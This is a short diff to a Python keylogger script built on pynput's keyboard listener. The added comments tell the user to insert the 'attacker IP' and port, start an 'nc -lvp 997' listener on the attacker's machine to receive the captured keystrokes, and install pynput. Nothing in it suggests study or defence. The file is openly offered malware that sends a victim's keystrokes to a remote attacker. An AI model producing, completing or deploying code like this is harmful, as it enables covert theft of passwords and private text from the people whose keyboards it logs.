@@ -28,3 +28,11 @@ listener = keyboard.Listener(on_press=log_key)
 listener.start()
 while True:
     time.sleep(1)
+
+#replace 'attacker IP' with the actual IP address and port number of the server you want to send the keystrokes to.
+
+#To Test
+#start listener using nc -lvp 997 on the attacker's machine to receive the keystrokes.
+#Run this Python script on your machine. with the correct IP address and port number.
+
+#Make sure you have the pynput library installed. You can install it using pip:
